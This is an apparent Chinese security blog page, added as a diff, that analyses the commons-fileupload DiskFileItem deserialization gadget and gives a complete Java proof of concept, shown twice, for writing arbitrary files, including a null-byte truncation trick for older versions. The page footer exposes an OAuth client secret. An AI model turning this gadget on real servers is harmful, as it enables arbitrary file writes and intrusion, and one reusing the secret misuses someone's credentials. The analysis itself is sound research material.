@@ -1,0 +1,426 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>FileUpload1反序列化链分析 | Le1a的菜园坝</title>
+<link rel="shortcut icon" href="https://le1a.github.io/favicon.ico?v=1695699802917">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://le1a.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="FileUpload1反序列化链分析 | Le1a的菜园坝 - Atom Feed" href="https://le1a.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-W25ZHLT37K"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-W25ZHLT37K');
+</script>
+
+
+    <meta name="description" content="0x00前置知识
+DiskFileItem
+org.apache.commons.fileupload.FileItem 表示在 multipart/form-data POST 请求中接收到的文件或表单项。
+org.apache.comm..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://le1a.github.io">
+  <img class="avatar" src="https://le1a.github.io/images/avatar.png?v=1695699802917" alt="">
+  </a>
+  <h1 class="site-title">
+    Le1a的菜园坝
+  </h1>
+  <p class="site-description">
+    欢迎来到菜园坝~~~
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/friends/" class="menu">
+          友链
+        </a>
+      
+    
+      
+        <a href="/post/about/" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+        <a href="https://github.com/Le1a/" target="_blank">
+          <i class="ri-github-line"></i>
+        </a>
+      
+    
+      
+        <a href="https://twitter.com/Le1aaaaa" target="_blank">
+          <i class="ri-twitter-line"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              FileUpload1反序列化链分析
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-11-07
+              </span>
+              <span>
+                6 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="0x00前置知识">0x00前置知识</h1>
+<h2 id="diskfileitem">DiskFileItem</h2>
+<p><code>org.apache.commons.fileupload.FileItem</code> 表示在 <code>multipart/form-data</code> POST 请求中接收到的文件或表单项。</p>
+<p><code>org.apache.commons.fileupload.disk.DiskFileItem</code> 是 FileItem 的实现类，用来封装一个请求消息实体中的全部项目，在 <code>FileUploadBase#parseRequest</code> 解析时进行封装，动作由 DiskFileItemFactory 的 <code>createItem</code> 方法来完成。</p>
+<p>当上传小文件时，直接保存在内存中，上传大文件则会以临时文件保存。</p>
+<p>在上传的过程中，用到了DiskFileItem类的以下几个属性:</p>
+<ul>
+<li>repository：文件保存的位置</li>
+<li>sizeThreshold：文件大小阈值，如果超过这个值，上传文件将会被储存在硬盘上</li>
+<li>fileName：原始文件名</li>
+<li>dfos：一个 DeferredFileOutputStream 对象，用于 OutputStream 的写出</li>
+<li>dfosFile：一个 File 对象，允许对其序列化的操作</li>
+</ul>
+<p><strong>DiskFileItem#readObject()</strong></p>
+<pre><code class="language-java">private void readObject(ObjectInputStream in)
+        throws IOException, ClassNotFoundException {
+    in.defaultReadObject();
+
+    if (repository != null) {
+        if (repository.isDirectory()) {
+            if (repository.getPath().contains(&quot;\0&quot;)) {
+                throw new IOException(format(
+                        repository.getPath()));
+            }
+        } else {
+            throw new IOException(format(
+                    repository.getAbsolutePath()));
+        }
+    }
+
+    OutputStream output = getOutputStream();
+    if (cachedContent != null) {
+        output.write(cachedContent);
+    } else {
+        FileInputStream input = new FileInputStream(dfosFile);
+        IOUtils.copy(input, output);
+        dfosFile.delete();
+        dfosFile = null;
+    }
+    output.close();
+
+    cachedContent = null;
+}
+</code></pre>
+<ul>
+<li>
+<p>commons-fileupload &lt; 1.3            可以使用<code>\0</code>截断，便可以控制文件名</p>
+</li>
+<li>
+<p>commons-fileupload &gt; = 1.3.1     新增了\0的判断，文件名使用 <code>format(&quot;upload_%s_%s.tmp&quot;, UID, getUniqueId())</code> 生成随机的文件名</p>
+</li>
+</ul>
+<p>这里调用<code>getOutputStream()</code>，获取dfos。</p>
+<pre><code class="language-java">public OutputStream getOutputStream()
+    throws IOException {
+    if (dfos == null) {
+        File outputFile = getTempFile();
+        dfos = new DeferredFileOutputStream(sizeThreshold, outputFile);
+    }
+    return dfos;
+}
+</code></pre>
+<p>如果<code>cachedContent</code>不为空，则直接把<code>cachedContent</code>写入。否则将从<code>dfosFile</code>的内容读取出来写入文件。</p>
+<p>这里看一下<code>dfosFile</code>是哪来的? 来自<code>DiskFileItem#writeObject</code></p>
+<pre><code class="language-java">private void writeObject(ObjectOutputStream out) throws IOException {
+    // Read the data
+    if (dfos.isInMemory()) { //判断是否在内存中，如果在内存中，则直接获取
+        cachedContent = get();
+    } else {
+        cachedContent = null;
+        dfosFile = dfos.getFile();//从dfos流当中获取对象
+    }
+</code></pre>
+<p>所以只需要控制<code>DiskFileItem</code>类的属性就能利用反序列化上传文件了。</p>
+<pre><code class="language-java">package com.le1a.util.fileupload1;
+
+import com.le1a.util.SerializeUtil;
+import org.apache.commons.fileupload.disk.DiskFileItem;
+import org.apache.commons.io.output.DeferredFileOutputStream;
+
+import java.io.File;
+import java.lang.reflect.Field;
+
+public class FileUpload {
+    public static void main(String[] args) throws Exception {
+        // 创建文件写入目录 File 对象，以及文件写入内容
+        String charset = &quot;UTF-8&quot;;
+        byte[] bytes   = &quot;flag{Success!!!}&quot;.getBytes(charset);
+
+        // 在 1.3 版本以下，可以使用 \0 截断
+        // File repository = new File(&quot;C:\\Users\\YiJiale\\Downloads123.txt\0&quot;);
+
+        // 在 1.3.1 及以上，只能指定目录
+      File   repository = new File(&quot;D:\\Cc\\IntelliJ IDEA\\FileUpload1&quot;);
+
+        // 创建 dfos 对象
+        DeferredFileOutputStream dfos = new DeferredFileOutputStream(0, repository);
+
+        // 使用 repository 初始化反序列化的 DiskFileItem 对象
+        DiskFileItem diskFileItem = new DiskFileItem(null, null, false, null, 0, repository);
+
+        // 序列化时 writeObject 要求 dfos 不能为 null
+        Field field1 = DiskFileItem.class.getDeclaredField(&quot;dfos&quot;);
+        field1.setAccessible(true);
+        field1.set(diskFileItem, dfos);
+
+        // 反射将 cachedContent 写入
+        Field field2 = DiskFileItem.class.getDeclaredField(&quot;cachedContent&quot;);
+        field2.setAccessible(true);
+        field2.set(diskFileItem, bytes);
+
+        byte[] evilbytes = SerializeUtil.serialize(diskFileItem);
+        SerializeUtil.unserialize(evilbytes);
+    }
+
+}
+</code></pre>
+<h1 id="0x01poc构造">0x01Poc构造</h1>
+<pre><code class="language-xml">&lt;dependency&gt;
+  &lt;groupId&gt;commons-fileupload&lt;/groupId&gt;
+  &lt;artifactId&gt;commons-fileupload&lt;/artifactId&gt;
+  &lt;version&gt;1.3.1&lt;/version&gt;
+&lt;/dependency&gt;
+
+&lt;dependency&gt;
+  &lt;groupId&gt;commons-io&lt;/groupId&gt;
+  &lt;artifactId&gt;commons-io&lt;/artifactId&gt;
+  &lt;version&gt;2.4&lt;/version&gt;
+&lt;/dependency&gt;
+</code></pre>
+<p>首先创建文件内容，然后设置编码，然后创建<code>repository</code>文件路径。</p>
+<pre><code class="language-java">String charset = &quot;UTF-8&quot;;
+byte[] bytes   = &quot;flag{Success!!!}&quot;.getBytes(charset);
+File   repository = new File(&quot;D:\\Cc\\IntelliJ IDEA\\FileUpload1&quot;);
+</code></pre>
+<p>然后创建dfos对象，并且把文件路径写入。</p>
+<pre><code class="language-java">DeferredFileOutputStream dfos = new DeferredFileOutputStream(0, repository);
+</code></pre>
+<p>创建DiskFileItem类</p>
+<pre><code class="language-java">DiskFileItem diskFileItem = new DiskFileItem(null, null, false, null, 0, repository);
+</code></pre>
+<p>反射修改DiskFileItem的dfos属性为我们刚才创建的dfos对象。</p>
+<pre><code class="language-java">Field dfosFile = DiskFileItem.class.getDeclaredField(&quot;dfos&quot;);
+dfosFile.setAccessible(true);
+dfosFile.set(diskFileItem, dfos);
+</code></pre>
+<p>然后反射修改<code>cachedContent</code>内容</p>
+<pre><code class="language-java">Field field2 = DiskFileItem.class.getDeclaredField(&quot;cachedContent&quot;);
+field2.setAccessible(true);
+field2.set(diskFileItem, bytes);
+</code></pre>
+<h2 id="完整poc">完整Poc</h2>
+<pre><code class="language-java">package com.le1a.util.fileupload1;
+
+import com.le1a.util.SerializeUtil;
+import org.apache.commons.fileupload.disk.DiskFileItem;
+import org.apache.commons.io.output.DeferredFileOutputStream;
+
+import java.io.File;
+import java.lang.reflect.Field;
+
+public class FileUpload {
+    public static void main(String[] args) throws Exception {
+        // 创建文件写入目录 File 对象，以及文件写入内容
+        String charset = &quot;UTF-8&quot;;
+        byte[] bytes   = &quot;flag{Success!!!}&quot;.getBytes(charset);
+
+        // 在 1.3 版本以下，可以使用 \0 截断
+        // File repository = new File(&quot;C:\\Users\\YiJiale\\Downloads123.txt\0&quot;);
+
+        // 在 1.3.1 及以上，只能指定目录
+      File   repository = new File(&quot;D:\\Cc\\IntelliJ IDEA\\FileUpload1&quot;);
+
+        // 创建 dfos 对象
+        DeferredFileOutputStream dfos = new DeferredFileOutputStream(0, repository);
+
+        // 使用 repository 初始化反序列化的 DiskFileItem 对象
+        DiskFileItem diskFileItem = new DiskFileItem(null, null, false, null, 0, repository);
+
+        // 序列化时 writeObject 要求 dfos 不能为 null
+        Field field1 = DiskFileItem.class.getDeclaredField(&quot;dfos&quot;);
+        field1.setAccessible(true);
+        field1.set(diskFileItem, dfos);
+
+        // 反射将 cachedContent 写入
+        Field field2 = DiskFileItem.class.getDeclaredField(&quot;cachedContent&quot;);
+        field2.setAccessible(true);
+        field2.set(diskFileItem, bytes);
+
+        byte[] evilbytes = SerializeUtil.serialize(diskFileItem);
+        SerializeUtil.unserialize(evilbytes);
+    }
+
+}
+</code></pre>
+<h1 id="0x02参考">0x02参考</h1>
+<p><a href="https://su18.org/post/ysoserial-su18-4/#%E6%94%BB%E5%87%BB%E6%9E%84%E9%80%A0">su18</a></p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#0x00%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86">0x00前置知识</a>
+<ul>
+<li><a href="#diskfileitem">DiskFileItem</a></li>
+</ul>
+</li>
+<li><a href="#0x01poc%E6%9E%84%E9%80%A0">0x01Poc构造</a>
+<ul>
+<li><a href="#%E5%AE%8C%E6%95%B4poc">完整Poc</a></li>
+</ul>
+</li>
+<li><a href="#0x02%E5%8F%82%E8%80%83">0x02参考</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://le1a.github.io/post/GolangStudyNote/">
+              <h3 class="post-title">
+                Golang学习笔记
+              </h3>
+            </a>
+          </div>
+        
+
+        
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container"></div>
+
+<script>
+
+  var gitalk = new Gitalk({
+    clientID: '883f90be69914455ab35',
+    clientSecret: '11fe2e13c68d9461524a00a6ad7ba52b6bc6b49b',
+    repo: 'Le1a.github.io',
+    owner: 'Le1a',
+    admin: ['Le1a'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+
+</script>
+
+          
+
+          
+        
+
+        <div class="site-footer">
+  
+  <a class="rss" href="https://le1a.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
